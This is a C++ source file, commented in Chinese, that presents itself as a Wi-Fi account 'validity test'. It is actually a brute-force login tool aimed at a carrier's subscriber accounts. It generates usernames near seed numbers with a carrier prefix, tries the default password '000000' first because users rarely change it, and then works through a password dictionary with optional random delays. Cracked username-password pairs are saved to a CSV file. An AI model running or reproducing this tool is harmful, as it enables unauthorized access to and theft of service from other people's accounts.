/**
 * @file CCDX_WIFI_TEST.cpp
 * @date 20.03.2024
 * @author RMSHE
 *
 * < CCDX_WIFI_TEST >
 * Copyright(C) 2024 RMSHE. All rights reserved.
 *
 * This program is free software : you can redistribute it and /or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.If not, see < https://www.gnu.org/licenses/>.
 *
 * Electronic Mail : asdfghjkl851@outlook.com
 */
#include <iostream>
#include "WebRequests.hpp"
#include "UsernameGenerator.hpp"

CSV_Operations csv_op;

/**
 * WIFI_Test 类用于测试和记录WIFI账户的有效性。
 * 它尝试连接到WIFI账户，使用预定义(默认)参数或提供参数进行尝试。
 */
class WIFI_Test {
private:
    //用户名列表的生成模式("r":随机模式; "s":顺序模式; "ir":增量随机模式; "m":多种子模式)
    std::string gen_mode;

    // 用户名列表的生成时在增量随机模式下时可用, 随机递减值的最大值通过这个参数传递
    uint64_t maxDecrement;

    // 尝试的用户名数量(生成用户名的数量)
    uint32_t amount;

    // 用户名种子(允许多个种子, 在使用多种子模式时程序会以每一个种子为中心点, 并在每个中心点的附近生成新用户名);
    std::set<uint64_t> usernamesSeed;

    // 密码尝试次数(从密码字典中抽取密码进行尝试的次数)
    uint32_t pwdTryNum;

    // 最大无效密码尝试次数(表示一个阈值：如果对某个用户名尝试的密码数量超过设定的阈值而未找到有效密码，程序将停止对该用户名的密码尝试。)
    uint16_t maxInvalidAttempts;

    // 用户名前缀(取决于运营商)
    std::string usernamePrefix;

    // 账户初始密码(取决于运营商,值得一试!)
    std::string initialPassword;

    // 爬虫随机延时: 请求延时机制, 最小延时时间和最大延时时间（单位：毫秒）
    uint16_t minDelayMs, maxDelayMs;

public:
    // 构造函数: 初始化测试参数
    explicit WIFI_Test(const std::string gen_mode = "m",                                      // 用户名列表生成模式
                       const uint32_t pwdTryNum = 100,                                        // 密码尝试次数
                       const uint32_t amount = 1000,                                           // 需生成的用户名数量
                       const uint16_t maxInvalidAttempts = 200,                               // 最大无效密码尝试次数
                       const std::set<uint64_t> usernamesSeed = { 8143086109, 9390026092 },   // 用户名种子
                       const uint64_t maxDecrement = 8,                                       // 生成用户名时随机递减值的最大限度
                       const uint16_t minDelayMs = 0,                                         // 最小延时时间
                       const uint16_t maxDelayMs = 0,                                         // 最大延时时间
                       const std::string &usernamePrefix = "043111",                          // 用户名前缀
                       const std::string &initialPassword = "000000") :                       // 账户的初始密码
        gen_mode(gen_mode),
        pwdTryNum(pwdTryNum),
        amount(amount),
        maxInvalidAttempts(maxInvalidAttempts),
        usernamesSeed(usernamesSeed),
        maxDecrement(maxDecrement),
        minDelayMs(minDelayMs),
        maxDelayMs(maxDelayMs),
        usernamePrefix(usernamePrefix),
        initialPassword(initialPassword) {}

    // 开始执行WIFI账户的有效性测试。
    void runTests() {
        UsernameGenerator ug(amount, maxInvalidAttempts, usernamesSeed, usernamePrefix);

        // 读取密码字典;
        dic.readDictionary();

        // 读取无效账号信息;
        dic.readInvalidAccounts();

        /**
         * 生成用户名列表;
         * @param gen_mode 生成模式("r":随机模式; "s":顺序模式; "ir":增量随机模式;)
         * @param maxDecrement 在增量随机模式下时可用, 随机递减值的最大值通过这个参数传递
         */
        ug.generateUsernamesList(gen_mode, maxDecrement);

        // 打印 UsernameGenerator 的调试信息;
        // ug.printDebugInfo();

        // 获取有效账户的数目
        size_t effectiveAccountAmount = dic.effectiveAccountCount();

        size_t usernamesListAmount = ug.usernamesListCount();

        while (true) {
            // 从用户名列表中抽取用户名
            currentUsername = ug.extractUniqueUsernam();

            // 如果用户名已被全部抽取完,则结束循环
            if (currentUsername == "") break;

            system("CLS");
            std::cout << "正在尝试第 " << ++usernameNum << " 个用户名, " <<
                "共找到 " << effectiveAccountNum << "/" << effectiveAccountNum + effectiveAccountAmount << " 个有效账户.\n" << std::endl;

            // 重置字典, 并设置初始密码(WIFI的初始密码,很多人没有改,所以第一次密码尝试用这个成功率很高!),
            // 同时检查并跳过已知的无效密码, 若为无效密码则直接(跳过本次循环)跳过无效密码, 避免重复测试.
            dic.copyPasswordDictionary(currentUsername, initialPassword);

            // 统计当前用户名的预期有效密码的数目
            size_t expectedValidPwdCount = dic.expectedValidPwdCount();

            for (uint32_t i = 0; i < pwdTryNum; ++i) {
                // 从密码字典中抽取密码
                currentPassword = dic.extractUniquePassword();

                // 如果密码已被全部抽取完,则结束循环
                if (currentPassword == "") break;

                std::cout << "\r当前用户名(" << usernameNum << "/" << usernamesListAmount << "):" << currentUsername <<
                    "\t当前密码(" << i << "/" << ((expectedValidPwdCount > pwdTryNum) ? pwdTryNum : expectedValidPwdCount) << "):" << currentPassword << "                ";

                WebRequests re(currentUsername, currentPassword);

                auto respond = re.login();

                if (respond[0].first == "result" && respond[0].second == "true") {
                    // 登录成功，保存有效账户信息到CSV文件
                    csv_op.writeToCSV({ { currentUsername , currentPassword } }, "./EffectiveAccount.csv");

                    // 增加有效账户计数
                    ++effectiveAccountNum;
                    break;
                } else {
                    // 登录失败, 记录对应用户名的无效密码;
                    dic.addInvalidAccount(currentUsername, currentPassword);
                }

                // 随机延时;
                tl.randomDelay(minDelayMs, maxDelayMs);
            }

            // 将无效账户（用户名和密码集合）保存到CSV文件中。
            dic.saveInvalidAccounts();
        }
    }

private:
    uint32_t usernameNum = 0;                       // 用于记录已经尝试过的用户名数目;
    uint32_t effectiveAccountNum = 0;               // 用于记录有效账户数;
    std::string currentUsername, currentPassword;   // 当前正在尝试的用户名和密码;
};

int main() {
    tl.displayInfo();       // 显示版本信息

    WIFI_Test test("m", 100, 1000);     // 初始化测试参数

    test.runTests();    // 运行测试

    system("pause");
    return 0;
}

/*

// CSV文件"创建-写-读-删除-存在性"测试;

std::vector<std::vector<std::string>> Invalid_Username;
for (int i = 0; i < 100; ++i) {
    Invalid_Username.push_back({ ug.randomGenerate() ,{ std::to_string(i) } });
}

csv_op.appendToCSV(Invalid_Username, "./Invalid_Username.csv");
std::vector<std::vector<std::string>> data = csv_op.readFromCSV("./Invalid_Username.csv");

for (auto &i : data) {
    for (auto &j : i) {
        std::cout << j << "\t";
    }
    std::cout << "\n";
}

std::cout << csv_op.isFileExists("./Invalid_Username.csv") << std::endl;

csv_op.deletePath("./Invalid_Username.csv");

std::cout << csv_op.isFileExists("./Invalid_Username.csv") << std::endl;

*/

/*

// 密码字典"读取-拷贝-随机化-抽取"测试;
for (auto &i : dic.readDictionary("./Dictionary.csv")) {
    std::cout << i << std::endl;
}

std::cout << "------------------------" << std::endl;

while (true) {
    std::string pwd = dic.extractUniquePassword();
    std::cout << pwd << std::endl;

    if (pwd == "")break;
}

*/

/*

// 用户名"生成-拷贝-抽取"测试;
// 生成用户名列表;
ug.generateUsernamesList("s");

while (true) {
    std::string use = ug.extractUniqueUsernam();
    std::cout << use << std::endl;

    if (use == "")break;
}

*/